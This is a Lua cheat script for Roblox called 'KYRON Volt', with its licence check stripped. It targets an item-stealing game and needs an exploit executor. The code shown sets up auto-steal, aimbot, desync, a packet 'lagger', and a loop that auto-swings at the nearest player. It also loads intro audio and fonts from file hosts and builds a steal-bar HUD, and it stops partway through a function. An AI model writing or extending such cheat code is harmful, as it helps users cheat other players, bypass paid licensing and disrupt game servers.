-- KYRON optimized build (.KYRON)
-- Performance changes:
--   * Removed injected unconditional console spam.
--   * Reduced anti-lag scan burst size to avoid frame-time spikes.
--   * Yielded large visual scans more frequently.
--   * Throttled idle auto-steal polling slightly.

-- Layout:
--   1. Bootstrap and shared runtime
--   2. Intro audio, font helpers, and the steal-bar HUD
--   3. Plot synchronization, stealing, carry, and movement controllers
--   4. Character physics, ragdoll recovery, anti-lag, and visual effects
--   5. Sky presets, avatar skins, and settings persistence
--   6. Targeting, bat controllers, counters, and ESP
--   7. Main interface, settings widgets, mobile controls, and Safe Mode
--   8. Save/reset UI and animation-pack hooks
--
-- The original build is kept as one entry-point script because its feature blocks
-- share local state and upvalues. Section labels below are comments only.

-- KYRON Volt (Luarmor auth removed)
local colors = nil
local Lighting = game:GetService("Lighting")
-- Main entry point; feature blocks share state through outer locals.
local function _KYRONMain()
  local Players, UserInputService, TweenService, RunService, Stats, localPlayer, playerGui, themePresets, introSongs
  local KYRONIntroSongIndex, playIntroMusic, playChainSpearAudio, font, loadCustomFont, normalStealSettings, autoStealSettings, autoStealRuntime, movementSpeedSettings, KYRONSafeModeEnabled
  local combatSettings, visualSettings, autoSaveSettings, saveKYRONSettings, dropControllerState, laggerState, featureConnections, autoTeleportState, tpMode, dropMode
  local color, KYRONStealBarScale, updateStealBarScale, frame, stealController, refreshAnimalCache, syncStealMode, stopAllStealAutomation, autoPathState, flag14
  local setInfiniteJumpEnabled, ragdollRecoveryState, startRagdollRecovery, stopRagdollRecovery, Lighting_, connection, tbl33, tbl34, flag15, tbl35
  local n31, n32, KYRONAntiLagHiddenObstacleVolume, startAntiLag, KYRONSetHardHitRange, KYRONSetPerfectHitRange
  local KYRONStartTpBatV3, KYRONStopTpBatV3, KYRONStartTpBatV4, KYRONStopTpBatV4
  local KYRONStartPerfectHit, KYRONStopPerfectHit

  do
    do
      local flag16, now2, connection2, n33, tbl36, tbl37, fn38, uiStroke, textLabel, tween
      local fn39, fn40, fn41, fn42

      do
        local tbl38, color2, v78, color3, uiScale, frame2

        do
          do
            do
              -- Bootstrap: duplicate-load guard, compatibility flags, and services.
              if _G._KYRONVoltRunning then
                warn("[KYRON Volt] Already loaded. Rejoin before running it again.")
                return
              end
              _G._KYRONVoltRunning = true
              _G._KYRONVoltCompatibility = true

              _G._KYRONVoltHiddenPropertyDisabled = function(arg, arg2, arg3)
                if type(sethiddenproperty) == "function" then
                  return sethiddenproperty(arg, arg2, arg3)
                end
              end

              _G._KYRONIntroEnabled = false
              _G._KYRONAntiDropEnabled = false
              print("[KYRON Volt] Compatibility profile enabled: Anti-Drop is disabled; supported hidden physics writes are enabled.")
              _G._KYRONBootSaveSession = {}
              _G._KYRONSaveSession = _G._KYRONBootSaveSession
              _G._KYRONMobileButtons = true
              _G._KYRONExecutionCount = (tonumber(_G._KYRONExecutionCount) or 0) + 1

              do
                local flag17 = _G._KYRONExecutionCount >= 2
                Players = game:GetService("Players")
                UserInputService = game:GetService("UserInputService")
                TweenService = game:GetService("TweenService")
                RunService = game:GetService("RunService")
                Stats = game:GetService("Stats")
                localPlayer = Players.LocalPlayer
                playerGui = localPlayer:WaitForChild("PlayerGui")

                if flag17 then
                  do
                    local KYRONDoubleLoadWarning = playerGui:FindFirstChild("KYRONDoubleLoadWarning")

                    if KYRONDoubleLoadWarning then
                      KYRONDoubleLoadWarning:Destroy()
                    end
                  end

                  local instance = Instance.new("ScreenGui")
                  instance.Name = "KYRONDoubleLoadWarning"
                  instance.ResetOnSpawn = false
                  instance.IgnoreGuiInset = true
                  instance.DisplayOrder = 10000
                  instance.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                  instance.Parent = playerGui
                  local instance2 = Instance.new("TextLabel")
                  instance2.Name = "Message"
                  instance2.AnchorPoint = Vector2.new(0.5, 0.5)
                  instance2.Position = UDim2.fromScale(0.5, 0.5)
                  instance2.Size = UDim2.new(0.9, 0, 0, 50)
                  instance2.BackgroundTransparency = 1
                  instance2.Text = "you loaded the script 2 times, the script will be bugged"
                  instance2.TextColor3 = Color3.fromRGB(240, 45, 45)
                  instance2.TextStrokeColor3 = Color3.fromRGB(70, 0, 0)
                  instance2.TextStrokeTransparency = 0.15
                  instance2.Font = Enum.Font.GothamBlack
                  instance2.TextSize = UserInputService.TouchEnabled and 20 or 24
                  instance2.TextWrapped = true
                  instance2.TextXAlignment = Enum.TextXAlignment.Center
                  instance2.TextYAlignment = Enum.TextYAlignment.Center
                  instance2.ZIndex = 10001
                  instance2.Parent = instance
                end
              end
            end

            if _G._KYRONSpeedControllerConn then
              pcall(function()
                _G._KYRONSpeedControllerConn:Disconnect()
              end)
            end

            _G._KYRONSpeedControllerConn = nil
            themePresets = {}

            do
              local tbl39 = {
                name = "PURPLE",
                accent = Color3.fromRGB(150, 101, 255),
                accentDark = Color3.fromRGB(104, 55, 210),
              }

              local tbl40 = {
                name = "BLUE",
                accent = Color3.fromRGB(58, 128, 245),
                accentDark = Color3.fromRGB(30, 82, 170),
              }

              local tbl41 = {
                name = "RED",
                accent = Color3.fromRGB(230, 42, 57),
                accentDark = Color3.fromRGB(155, 24, 40),
              }

              local tbl42 = {
                name = "PINK",
                accent = Color3.fromRGB(255, 105, 180),
                accentDark = Color3.fromRGB(190, 65, 145),
              }

              local tbl43 = {
                name = "YELLOW",
                accent = Color3.fromRGB(255, 214, 0),
                accentDark = Color3.fromRGB(200, 160, 0),
              }

              local tbl44 = {
                name = "GREY",
                accent = Color3.fromRGB(42, 42, 46),
                accentDark = Color3.fromRGB(28, 28, 32),
              }

              local tbl45 = {
                name = "WHITE",
                accent = Color3.fromRGB(255, 255, 255),
                accentDark = Color3.fromRGB(200, 210, 210),
              }

              local tbl46 = {
                name = "FOREST",
                accent = Color3.fromRGB(46, 139, 87),
                accentDark = Color3.fromRGB(34, 70, 45),
              }

              themePresets[1] = tbl39
              themePresets[2] = tbl40
              themePresets[3] = tbl41
              themePresets[4] = tbl42
              themePresets[5] = tbl43
              themePresets[6] = tbl44
              themePresets[7] = tbl45
              themePresets[8] = tbl46
            end
          end

          do
            -- Intro song catalog and playback helpers.
            introSongs = {
              {
                name = "Song 1",
                url = "https://files.catbox.moe/gm9wuu.mp3",
                cover = "rbxthumb://type=Asset&id=86103485431123&w=420&h=420",
              },
              {
                name = "Song 2",
                url = "https://files.catbox.moe/4fjhdy.mp3",
                cover = "rbxthumb://type=Asset&id=115168375440446&w=420&h=420",
              },
              {
                name = "Song 3",
                url = "https://files.catbox.moe/s2epvz.mp3",
                cover = "rbxthumb://type=Asset&id=119640313536275&w=420&h=420",
              },
              {
                name = "Song 4",
                url = "https://files.catbox.moe/yd8wst.mp3",
                cover = "rbxthumb://type=Asset&id=128076226146682&w=420&h=420",
              },
              {
                name = "Song 5",
                url = "https://files.catbox.moe/y2npwy.mp3",
                cover = "rbxthumb://type=Asset&id=129638978079711&w=420&h=420",
              },
              {
                name = "Song 6",
                url = "https://files.catbox.moe/s7wuzb.mp3",
                cover = "rbxthumb://type=Asset&id=106003436039570&w=420&h=420",
              },
              {
                name = "Song 7",
                url = "https://files.catbox.moe/n52dvv.mp3",
                cover = "rbxthumb://type=Asset&id=101703838295262&w=420&h=420",
              },
              {
                name = "Song 8",
                url = "https://files.catbox.moe/p5mvim.mp3",
                cover = "rbxthumb://type=Asset&id=112003973514134&w=420&h=420",
              },
              {
                name = "Song 9",
                url = "https://files.catbox.moe/xfihnx.mp3",
                cover = "rbxthumb://type=Asset&id=123579863939760&w=420&h=420",
              },
              {
                name = "Song 10",
                url = "https://files.catbox.moe/byk07p.mp3",
                cover = "rbxthumb://type=Asset&id=121860015578133&w=420&h=420",
              },
            }

            KYRONIntroSongIndex = #introSongs

            playIntroMusic = function(arg)
              if #introSongs ~= 0 then
                if type(writefile) ~= "function" or type(getcustomasset) ~= "function" then
                  warn("[KYRON] Intro music is unavailable: this executor does not support custom assets.")
                  return
                end

                task.spawn(function()
                  local ok, result = pcall(function()
                    local clamp = math.clamp
                    local floor2 = math.floor
                    local num = tonumber(_G._KYRONIntroSongIndex) or 1
                    local n34 = #introSongs
                    local v79 = introSongs[clamp(floor2(num), 1, n34)]
                    local str9 = "KYRONIntroMusic_" .. (v79.cacheFile or v79.url:match("/([^/]+)$") or "song.mp3"):gsub("[^%w%._%-]", "_")

                    if type(isfile) ~= "function" or not isfile(str9) then
                      writefile(str9, game:HttpGet(v79.url))
                    end

                    local sound = Instance.new("Sound")
                    sound.Name = "KYRONIntroMusic"
                    sound.SoundId = getcustomasset(str9)
                    sound.Volume = 0.7
                    sound.Looped = false
                    sound.Parent = game:GetService("SoundService")
                    sound.TimePosition = tonumber(v79.startTime) or 0
                    sound:Play()
                    if arg and arg(sound) == false then
                      sound:Destroy()
                      return
                    end
                    task.wait(6)
                    if not sound.Parent then
                      return
                    end
                    local tween2 = TweenService:Create(sound, TweenInfo.new(0.5, Enum.EasingStyle.Linear), { Volume = 0 })
                    tween2:Play()
                    tween2.Completed:Wait()
                    sound:Destroy()
                  end)

                  if not ok then
                    warn("[KYRON] Could not play intro music:", result)
                  end
                end)

                return
              end

              do
                return
              end
            end

            playChainSpearAudio = function(arg)
              local flag17 = type(writefile) ~= "function"
              local flag18

              if flag17 then
                flag18 = flag17
              else
                flag18 = type(getcustomasset) ~= "function"
              end

              if flag18 then
                warn("[KYRON] Chain-spear audio is unavailable: this executor does not support custom assets.")
                return
              end

              task.spawn(function()
                local ok, result = pcall(function()
                  if type(isfile) ~= "function" or not isfile("KYRONChainSpear_k19260.mp3") then
                    writefile("KYRONChainSpear_k19260.mp3", game:HttpGet("https://files.catbox.moe/k19260.mp3"))
                  end

                  local SoundService = game:GetService("SoundService")

                  for _, child in ipairs(SoundService:GetChildren()) do
                    if child:IsA("Sound") and child.Name == "KYRONChainSpearSound" then
                      child:Destroy()
                    end
                  end

                  local instance = Instance.new("Sound")
                  instance.Name = "KYRONChainSpearSound"
                  instance.SoundId = getcustomasset("KYRONChainSpear_k19260.mp3")
                  instance.Volume = 0
                  instance.Looped = true
                  instance.Parent = SoundService
                  instance:Play()
                  if arg and arg(instance) == false then
                    instance:Destroy()
                    return
                  end
                  TweenService:Create(instance, TweenInfo.new(0.4, Enum.EasingStyle.Linear), { Volume = 1.25 }):Play()
                end)

                if not ok then
                  warn("[KYRON] Could not play chain-spear audio:", result)
                end
              end)
            end

            -- Font mode and text styling.
            font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold)
            _G._KYRONFontMode = _G._KYRONFontMode == "PIXEL" and "PIXEL" or "DEFAULT"

            _G._KYRONApplyFontMode = function(arg)
              local function fn43(arg2)
                if not (arg2:IsA("TextLabel") or arg2:IsA("TextButton") or arg2:IsA("TextBox")) then
                  return
                end

                if arg2:GetAttribute("_KYRONForceGothamBlack") then
                  pcall(function()
                    arg2.Font = Enum.Font.GothamBlack
                  end)

                  return
                end

                if _G._KYRONFontMode == "PIXEL" then
                  if not _G._KYRONBoldPixelFont then
                    pcall(function()
                      local font2 = Font.fromEnum(Enum.Font.Arcade)
                      _G._KYRONBoldPixelFont = Font.new(font2.Family, Enum.FontWeight.Bold, font2.Style)
                    end)
                  end

                  if _G._KYRONBoldPixelFont then
                    pcall(function()
                      arg2.FontFace = _G._KYRONBoldPixelFont
                    end)
                  else
                    pcall(function()
                      arg2.Font = Enum.Font.Arcade
                    end)
                  end

                  if arg2:GetAttribute("_KYRONFontOriginalStrokeTransparency") == nil then
                    arg2:SetAttribute("_KYRONFontOriginalStrokeTransparency", arg2.TextStrokeTransparency)
                    arg2:SetAttribute("_KYRONFontOriginalStrokeColor", arg2.TextStrokeColor3)
                  end

                  pcall(function()
                    arg2.TextStrokeTransparency = 1
                  end)
                else
                  pcall(function()
                    arg2.FontFace = font
                  end)

                  local attribute = arg2:GetAttribute("_KYRONFontOriginalFont")
                  local attribute2 = arg2:GetAttribute("_KYRONFontOriginalStrokeColor")

                  if attribute ~= nil then
                    pcall(function()
                      arg2.TextStrokeTransparency = attribute
                      arg2.TextStrokeColor3 = attribute2
                    end)

                    arg2:SetAttribute("_KYRONFontOriginalStrokeTransparency", nil)
                    arg2:SetAttribute("_KYRONFontOriginalStrokeColor", nil)
                  end
                end
              end

              if arg then
                fn43(arg)

                for _, descendant in ipairs(arg:GetDescendants()) do
                  fn43(descendant)
                end

                return
              end

              local v79 = localPlayer:FindFirstChild("Backpack")

              if v79 then
                for _, descendant in ipairs(v79:GetDescendants()) do
                  fn43(descendant)
                end
              end

              local character = localPlayer.Character

              if character then
                for _, descendant in ipairs(character:GetDescendants()) do
                  fn43(descendant)
                end
              end
            end

            do
              local flag17 = false

              loadCustomFont = function()
                if _G._KYRONVoltCompatibility then
                  return
                end

                if flag17 then
                  return
                end
                flag17 = true

                task.spawn(function()
                  pcall(function()
                    if not (isfile and writefile and getcustomasset) then
                      return
                    end

                    if isfile("starborn.ttf") then
                      _G._KYRONApplyFontMode()
                      return
                    end
                    writefile("starborn.ttf", game:HttpGet("https://granny.anondrop.net/uploads/6c2505542959f371/Starborn.ttf"))

                    writefile(
                      "starborn.json",
                      game:GetService("HttpService"):JSONEncode({
                        name = "Starborn",
                        faces = {
                          {
                            name = "Regular",
                            weight = 0.7,
                            style = "normal",
                            assetId = getcustomasset("starborn.ttf"),
                          },
                        },
                      })
                    )

                    -- Optional custom-font loader.
                    font = Font.new(getcustomasset("starborn.json"))
                    task.wait(1)
                    _G._KYRONApplyFontMode()
                  end)
                end)
              end
            end
          end

          do
            _G._KYRONNormalPauseOptions = { 70, 80, 85, 90, 95, 100 }

            _G._KYRONNormalizeNormalPausePercent = function(arg)
              local n34 = tonumber(arg) or 75
              local v79 = 70
              local huge = math.huge

              for _, KYRONNormalPauseOption in ipairs(_G._KYRONNormalPauseOptions) do
                local n35 = math.abs(n34 - KYRONNormalPauseOption)

                if n35 < huge then
                  huge = n35
                  v79 = KYRONNormalPauseOption
                end
              end

              return v79
            end

            normalStealSettings = {
              StealRadius = 60,
              StealDuration = 1.3,
              NormalStealPausePercent = 75,
            }

            autoStealSettings = { AutoSteal = true }
            autoStealRuntime = {}
            flag16 = false
            now2 = nil
            connection2 = nil
            n33 = 0
            tbl36 = {}
            tbl38 = {}
            tbl37 = {}
            color2 = Color3.fromRGB(255, 255, 240)

            movementSpeedSettings = {
              NS = 60,
              CS = 2,
              PL = 70,
              LG_N = 34,
              LG_C = 4,
              family = "normal",
              carry = false,
            }

            if _G._KYRONAntiDropEnabled == nil then
              _G._KYRONAntiDropEnabled = false
            end

            KYRONSafeModeEnabled = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

            combatSettings = {
              aimbot = false,
              aimSpd = 58,
              swing = false,
              desync = false,
              desyncSwing = false,
              antiMode = false,
              tpMirror = false,
              hardHit = false,
              hardHitRange = 10,
              perfectHit = false,
              perfectHitRange = 175,
            }

            -- Vanta Insta Reset transplant.
            local KYRONInstaResetBusy = false

            local function KYRONInstaReset()
              if KYRONInstaResetBusy then
                return false
              end

              local character = localPlayer.Character
              local humanoid = character and character:FindFirstChildOfClass("Humanoid")
              local root = character and character:FindFirstChild("HumanoidRootPart")
              if not character or not humanoid then
                return false
              end

              KYRONInstaResetBusy = true

              local camera = workspace.CurrentCamera
              local spawnConnection
              spawnConnection = localPlayer.CharacterAdded:Connect(function(newCharacter)
                if spawnConnection then
                  pcall(function() spawnConnection:Disconnect() end)
                  spawnConnection = nil
                end
                task.spawn(function()
                  local newHumanoid = newCharacter:FindFirstChildOfClass("Humanoid")
                    or newCharacter:WaitForChild("Humanoid", 5)
                  task.wait(0.1)
                  local currentCamera = workspace.CurrentCamera or camera
                  if currentCamera and newHumanoid then
                    pcall(function()
                      currentCamera.CameraType = Enum.CameraType.Custom
                      currentCamera.CameraSubject = newHumanoid
                    end)
                  end
                  KYRONInstaResetBusy = false
                end)
              end)

              pcall(function()
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
                humanoid.BreakJointsOnDeath = true
                humanoid.PlatformStand = false
                humanoid.Health = 0
                humanoid:ChangeState(Enum.HumanoidStateType.Dead)
              end)

              pcall(function()
                character:BreakJoints()
              end)

              if root and root.Parent then
                pcall(function()
                  root.AssemblyLinearVelocity = Vector3.new(0, -500, 0)
                  root.AssemblyAngularVelocity = Vector3.zero
                  root.CFrame = root.CFrame + Vector3.new(0, -750, 0)
                end)
              end

              task.delay(1.5, function()
                if localPlayer.Character == character then
                  pcall(function()
                    humanoid.Health = 0
                    character:BreakJoints()
                    humanoid:Destroy()
                  end)
                end
                task.delay(2, function()
                  if KYRONInstaResetBusy and localPlayer.Character == character then
                    KYRONInstaResetBusy = false
                  end
                end)
              end)

              return true
            end

            _G._KYRONInstaReset = KYRONInstaReset

            _G._KYRONTpBatSwingDelay = math.clamp(tonumber(_G._KYRONTpBatSwingDelay) or 0.007, 0.001, 1)
            _G._KYRONTpBatDistance = math.clamp(tonumber(_G._KYRONTpBatDistance) or 8, 0.5, 24)
            _G._KYRONTpBatV3Enabled = _G._KYRONTpBatV3Enabled == true

            if _G._KYRONTpBatCameraSteering == nil then
              _G._KYRONTpBatCameraSteering = true
            end

            -- Ryzen Hard Hit / Perfect Hit transplant.
            -- Hard Hit in the supplied Ryzen source is a state/range feature;
            -- its old ring renderer is intentionally a no-op, so no extra hit
            -- action is invented here. Perfect Hit keeps Ryzen's nearest-target
            -- scan and 45 ms swing cooldown.
            _G._KYRONRyzenHardHit = _G._KYRONRyzenHardHit or {
              enabled = false,
              range = 10,
            }
            _G._KYRONRyzenPerfectHit = _G._KYRONRyzenPerfectHit or {
              enabled = false,
              range = 175,
              cd = false,
              conn = nil,
            }

            local function KYRONFindBatForPerfectHit()
              local character = localPlayer.Character
              if not character then return nil end
              local tool = character:FindFirstChildOfClass("Tool")
              if tool then
                return tool
              end
              return nil
            end

            local function KYRONSwingBatForPerfectHit()
              local character = localPlayer.Character
              if not character then return end
              local bat = KYRONFindBatForPerfectHit()
              if not bat then return end
              local ok = pcall(function()
                if _G._KYRONOshaBatCounter and _G._KYRONOshaBatCounter.hit then
                  _G._KYRONOshaBatCounter.hit(character)
                elseif bat.Activate then
                  bat:Activate()
                end
              end)
              return ok
            end

            local function KYRONPerfectHitIsRagdoll()
              local character = localPlayer.Character
              local hum = character and character:FindFirstChildOfClass("Humanoid")
              if not hum then return false end
              local st = hum:GetState()
              return st == Enum.HumanoidStateType.Ragdoll
                or st == Enum.HumanoidStateType.FallingDown
                or hum.PlatformStand == true
            end

            local function KYRONPerfectHitGetTarget()
              local character = localPlayer.Character
              local root = character and character:FindFirstChild("HumanoidRootPart")
              if not root then return nil end
              local nearest, shortest = nil, math.huge
              local range = tonumber(combatSettings.perfectHitRange) or 175
              for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= localPlayer and plr.Character then
                  local tr = plr.Character:FindFirstChild("HumanoidRootPart")
                  local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                  if tr and hum and hum.Health > 0 then
                    local d = (tr.Position - root.Position).Magnitude
                    if d <= range and d < shortest then
                      shortest = d
                      nearest = tr
                    end
                  end
                end
              end
              return nearest
            end

            local function KYRONPerfectHitTryHit()
              local state = _G._KYRONRyzenPerfectHit
              if not state.enabled or state.cd then return end
              state.cd = true
              KYRONSwingBatForPerfectHit()
              task.delay(0.045, function()
                state.cd = false
              end)
            end

            KYRONStartPerfectHit = function()
              local state = _G._KYRONRyzenPerfectHit
              state.enabled = true
              combatSettings.perfectHit = true
              if state.conn then return end
              state.conn = RunService.Heartbeat:Connect(function()
                if not state.enabled then return end
                if not localPlayer.Character then return end
                if KYRONPerfectHitIsRagdoll() then return end
                if KYRONPerfectHitGetTarget() then
                  KYRONPerfectHitTryHit()
                end
              end)
            end

            KYRONStopPerfectHit = function()
              local state = _G._KYRONRyzenPerfectHit
              state.enabled = false
              combatSettings.perfectHit = false
              if state.conn then
                pcall(function() state.conn:Disconnect() end)
                state.conn = nil
              end
              state.cd = false
            end

            KYRONSetHardHitRange = function(v)
              local n = tonumber(v)
              if not n then return end
              n = math.clamp(n, 1, 100)
              combatSettings.hardHitRange = n
              _G._KYRONRyzenHardHit.range = n
            end

            KYRONSetPerfectHitRange = function(v)
              local n = tonumber(v)
              if not n then return end
              n = math.clamp(n, 10, 500)
              combatSettings.perfectHitRange = n
              _G._KYRONRyzenPerfectHit.range = n
            end

            _G._loadedOn_mirrorTP = false

            visualSettings = {
              antilag = false,
              sky = false,
              stretch = false,
              fov = false,
              fovVal = 120,
            }

            autoSaveSettings = { auto = true }

            -- Auto Carry additions.
            -- Auto Carry Speed follows the real carry/steal state and switches
            -- to the normal Carry speed while the player is holding a brainrot.
            -- Auto Carry on Enemy Base switches to Carry when near another
            -- player's base, using the same PlotSign/YourBase detection already
            -- used by KYRON's steal controller.
            _G._KYRONAutoCarrySpeedEnabled = _G._KYRONAutoCarrySpeedEnabled == true
            _G._KYRONAutoCarryEnemyBaseEnabled = _G._KYRONAutoCarryEnemyBaseEnabled == true
            _G._KYRONAutoCarryEnemyBaseRange = math.clamp(tonumber(_G._KYRONAutoCarryEnemyBaseRange) or 35, 5, 150)

            if _G._KYRONMobileBtnScale == nil then
              _G._KYRONMobileBtnScale = 1
            end

            if _G._KYRONUIScale == nil then
              _G._KYRONUIScale = 65
            end

            if _G._KYRONStealBarScale == nil then
              _G._KYRONStealBarScale = 70
            end

            if _G._KYRONCircleButtons == nil then
              _G._KYRONCircleButtons = false
            end

            if _G._KYRONAdvancedLaggerButton == nil then
              _G._KYRONAdvancedLaggerButton = true
            end

            _G._KYRONInvertUI = false
            _G._KYRONMobileButtonsHidden = false

            if type(_G._KYRONHiddenMobileButtons) ~= "table" then
              _G._KYRONHiddenMobileButtons = {}
            end

            if _G._KYRONIntroEnabled == nil then
              _G._KYRONIntroEnabled = false
            end

            _G._KYRONIntroSongLocked = _G._KYRONIntroSongLocked == true

            if _G._KYRONIntroSongLocked then
              _G._KYRONIntroSongIndex = math.clamp(math.floor(tonumber(_G._KYRONIntroSongIndex) or 1), 1, #introSongs)
            else
              _G._KYRONIntroSongIndex = KYRONIntroSongIndex
            end

            _G._KYRONTPMirrorEnabled = false

            if _G._KYRONAutoCarry == nil then
              _G._KYRONAutoCarry = false
            end

            if _G._KYRONAutoCarryMode ~= "ON STEAL" and _G._KYRONAutoCarryMode ~= "WHEN NEAR" then
              _G._KYRONAutoCarryMode = "WHEN NEAR"
            end

            if _G._KYRONSafeModeEnabled == nil then
              _G._KYRONSafeModeEnabled = KYRONSafeModeEnabled
            end

            if _G._loadedOn_safeMode == nil then
              _G._loadedOn_safeMode = KYRONSafeModeEnabled
            end

            if _G._KYRONKickWarningEnabled == nil then
              _G._KYRONKickWarningEnabled = true
            end

            if _G._loadedOn_kickWarning == nil then
              _G._loadedOn_kickWarning = _G._KYRONKickWarningEnabled
            end

            if _G._KYRONSafeModeMonitor then
              pcall(function()
                _G._KYRONSafeModeMonitor:Disconnect()
              end)
            end

            if _G._KYRONSafeModeViewportConn then
              pcall(function()
                _G._KYRONSafeModeViewportConn:Disconnect()
              end)
            end

            if _G._KYRONSafeModeNotifyGui then
              pcall(function()
                _G._KYRONSafeModeNotifyGui:Destroy()
              end)
            end

            if type(_G._KYRONSafeModeCarryConnections) == "table" then
              for _, KYRONSafeModeCarryConnection in pairs(_G._KYRONSafeModeCarryConnections) do
                pcall(function()
                  KYRONSafeModeCarryConnection:Disconnect()
                end)
              end
            end

            _G._KYRONSafeModeMonitor = nil
            _G._KYRONSafeModeViewportConn = nil
            _G._KYRONSafeModeNotifyGui = nil
            _G._KYRONSafeModeNotifyHolder = nil
            _G._KYRONSafeModeCarryConnections = nil

            _G._KYRONSafeModeState = {
              countdown = false,
              holding = false,
              pending = {
                aimbot = false,
                tpBat = false,
                autoLeft = false,
                autoRight = false,
              },
              queuedAt = {
                aimbot = 0,
                tpBat = 0,
                autoLeft = 0,
                autoRight = 0,
              },
              timerPhase = "unknown",
              timerLastNumber = nil,
              timerSawInactive = false,
              timerStartUsed = false,
              timerRoundSeen = false,
              timerInactiveSince = nil,
              lastCheck = 0,
              resetLocked = false,
            }

            saveKYRONSettings = function() end

            dropControllerState = { active = false }

            laggerState = {
              active = false,
              packets = 270,
              delay = 0.25,
              thread = nil,
              key = nil,
              gpKey = nil,
            }

            featureConnections = {}
            autoTeleportState = nil
            tpMode = nil
            dropMode = nil

            if _G._KYRONAutoPathMatchSpeed == nil then
              _G._KYRONAutoPathMatchSpeed = false
            end

            fn38 = function()
              if _G._KYRONAutoPathActive and not _G._KYRONAutoPathMatchSpeed then
                return movementSpeedSettings.NS
              end

              if movementSpeedSettings.family == "lagger" then
                return movementSpeedSettings.carry and movementSpeedSettings.LG_N or movementSpeedSettings.LG_C
              end

              if movementSpeedSettings.family == "pinglagger" then
                return movementSpeedSettings.PL
              end
              return movementSpeedSettings.carry and movementSpeedSettings.CS or movementSpeedSettings.NS
            end

            if not fireproximityprompt then
              fireproximityprompt = getgenv and getgenv().fireproximityprompt
                or function(arg)
                  pcall(function()
                    arg:InputHoldBegin()
                    task.wait(0.05)
                    arg:InputHoldEnd()
                  end)
                end
            end

            for _, v79 in ipairs({ "KYRONStealBar", "KYRONStealBarHUD" }) do
              local v80 = playerGui:FindFirstChild(v79)

              if v80 then
                v80:Destroy()
              end
            end

            v78 = 320
            color3 = Color3.fromRGB(28, 28, 40)
            color = Color3.fromRGB(140, 190, 250)

            do
              local n34 = KYRONSafeModeEnabled and 60 or 100
              KYRONStealBarScale = math.clamp(math.floor(tonumber(_G._KYRONStealBarScale) or n34), 50, 150)
            end
          end

          if _G._KYRONStealBarMatch == nil then
            _G._KYRONStealBarMatch = false
          end

          -- Steal-bar HUD: background assets, scale, and placement.
          _G._KYRONStealBarBackgroundAssets = {
            "rbxassetid://90631990302263",
            "rbxassetid://109619268613730",
            "rbxassetid://90453834580322",
            "rbxassetid://82173577293417",
            "rbxassetid://88369503310562",
            "rbxassetid://80708025126373",
            "rbxassetid://111949903851987",
            "rbxassetid://135181794444219",
          }

          uiScale = nil

          updateStealBarScale = function()
            _G._KYRONStealBarScale = KYRONStealBarScale

            if uiScale then
              uiScale.Scale = KYRONStealBarScale / 100
            end
          end

          do
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "KYRONStealBarHUD"
            screenGui.ResetOnSpawn = false
            screenGui.IgnoreGuiInset = true
            screenGui.DisplayOrder = 50
            screenGui.Enabled = true
            screenGui.Parent = playerGui
            frame2 = Instance.new("Frame", screenGui)
          end
        end

        do
          do
            do
              frame2.Name = "StealBar"
              frame2.Size = UDim2.new(0, v78, 0, 66)
              frame2.Position = UDim2.new(0.5, -160, 1, -76)
              frame2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
              frame2.BackgroundTransparency = 0
              frame2.BorderSizePixel = 0
              frame2.Active = true
              frame2.ZIndex = 50
              frame2.Visible = false
              frame2.ClipsDescendants = false

              do
                local function fn43()
                  local instance = Instance.new("ImageLabel")
                  instance.Name = "KYRONStealBarBG"
                  instance.BackgroundTransparency = 1
                  instance.Visible = false
                  instance.BorderSizePixel = 0
                  instance.Size = UDim2.fromScale(1, 1)
                  instance.ImageTransparency = 0
                  instance.ScaleType = Enum.ScaleType.Crop
                  instance.ZIndex = 50
                  instance.Parent = frame2
                  Instance.new("UICorner", instance).CornerRadius = UDim.new(0, 12)

                  _G._KYRONApplyStealBarBackground = function()
                    local KYRONStealBarMatch = _G._KYRONStealBarMatch

                    if KYRONStealBarMatch then
                      KYRONStealBarMatch = math.clamp(math.floor(tonumber(_G._KYRONBgIdx) or 0), 0, #_G._KYRONStealBarBackgroundAssets)
                    end

                    KYRONStealBarMatch = KYRONStealBarMatch or 0
                    instance.Image = KYRONStealBarMatch == 0 and "" or _G._KYRONStealBarBackgroundAssets[KYRONStealBarMatch]
                    instance.ImageColor3 = _G._KYRONStealBarMatch and _G._KYRONBackgroundColorMatch and (_G._KYRONAccent or Color3.fromRGB(255, 240, 255)) or Color3.fromRGB(240, 255, 240)
                    instance.Visible = false
                    instance.ImageTransparency = 1
                    frame2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    frame2.BackgroundTransparency = 0
                  end

                  _G._KYRONApplyStealBarBackground()
                end

                fn43()
              end
            end

            _G._KYRONApplyStealBarPosition = function()
              local KYRONStealBarPos = _G._KYRONStealBarPos
              if type(KYRONStealBarPos) ~= "table" then
                return
              end
              local currentCamera = workspace.CurrentCamera
              currentCamera = currentCamera and currentCamera.ViewportSize
              if not currentCamera or currentCamera.X <= 0 or currentCamera.Y <= 0 then
                return
              end
              local flag17 = type(KYRONStealBarPos.vw) == "number"
                and type(KYRONStealBarPos.vh) == "number"
                and math.abs(currentCamera.X - KYRONStealBarPos.vw) < 1
                and math.abs(currentCamera.Y - KYRONStealBarPos.vh) < 1
                and type(KYRONStealBarPos.xs) == "number"

              if flag17 then
                flag17 = type(KYRONStealBarPos.ys) == "number"
              end

              local n34, n35

              if flag17 then
                n34 = KYRONStealBarPos.xs * currentCamera.X + (KYRONStealBarPos.xo or 0)
                n35 = KYRONStealBarPos.ys * currentCamera.Y + (KYRONStealBarPos.yo or 0)
              else
                if not (type(KYRONStealBarPos.nx) == "number" and type(KYRONStealBarPos.ny) == "number") then
                  return
                end
                n34 = KYRONStealBarPos.nx * currentCamera.X
                n35 = KYRONStealBarPos.ny * currentCamera.Y
              end

              local absoluteSize = frame2.AbsoluteSize
              local n36 = math.max(0, currentCamera.X - math.max(absoluteSize.X, v78))
              local n37 = math.max(0, currentCamera.Y - math.max(absoluteSize.Y, 54))
              frame2.Position = UDim2.fromOffset(math.clamp(n34, 0, n36), math.clamp(n35, 0, n37))
            end

            _G._KYRONApplyStealBarPosition()
